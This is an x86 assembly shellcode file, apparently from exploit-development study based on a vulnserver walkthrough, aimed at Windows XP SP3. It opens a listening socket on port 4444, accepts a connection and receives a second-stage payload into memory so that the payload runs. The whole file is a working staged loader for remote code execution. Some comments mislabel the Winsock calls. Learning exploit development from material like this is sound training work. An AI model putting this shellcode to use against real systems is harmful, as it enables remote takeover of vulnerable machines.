; Purpose: Use socket reconstruction to open listening port to receive shellcode 
; Target OS: Windows XP SP3 
;
; Shellcode created from walkthough by: https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gter-command
;

global _start			

section .text
_start:

; setup WS2_32.socket
sub esp, byte 0x4A	; need to make make room to push values on stack
sub esp, byte 0x4A	
xor eax, eax		; zero out eax 
mov al, 6		; put value 6 for IPPROTO_TCP
push eax		; push value on stack
mov al, 1		; put value 1 for SOCK_STREAM
push eax		; push value on stack
inc eax			; make value 2 for AF_INET
push eax		; push value on stack
mov ebx, 0x40257CFF	; move socket address 
shr ebx, 8		; shift right to add null byte
call ebx		; call socket
mov edi, eax		; store returned socket in edi

; Setup S2_32.bind
xor eax, eax
push eax
push eax
push word 0x5c11       	; sockaddr.sin_port  4444
xor ebx, ebx		; clear ebx
add bl, 2		; sockaddr.sin_family     : AF_INET = 2
push word bx
mov edx, esp		; pointer for s
push byte 16		; length
push edx		; pointer to s
push edi		; saved socket
mov ebx, 0x402564FF     ; address of connect
shr ebx, 8		; shift right to add null byte
call ebx		; call socket

; Setup WS2_32.listen
push byte 0x7f	        ; push big backlog
push edi		; saved socket
mov ebx, 0x402554FF	; address of connect
shr ebx, 8		; shift right to add null byte
call ebx		; call connect

; setup WS2_32.accept
xor eax, eax		; zero out eax
push eax		; push null byte
push eax		; push null byte
push edi		; push saved socket
mov ebx, 0x40254CFF	; address of accept
shr ebx, 8		; shift right to add null byte
call ebx		; call accept
mov edi, eax		; save the socket from the accept call

; setup of WS2_32.recv
xor eax, eax		; zero out eax
push eax
mov ah, 2		; identify length for the receive buffer (512)
push eax
push esp		; push stack pointer onto stack
pop ecx			; pop into ECX to perform stack adjustment
add cx,byte +0x51	; Add 162 bytes to ESP to place us at the next instruction after the call to recv
add cx,byte +0x51
push ecx		; push new stack pointer onto stack
push edi		; push socket createded from accept
mov ebx, 0x40252CFF	; address of recv
shr ebx, 8		; shift right to add null byte
call ebx		; call recv
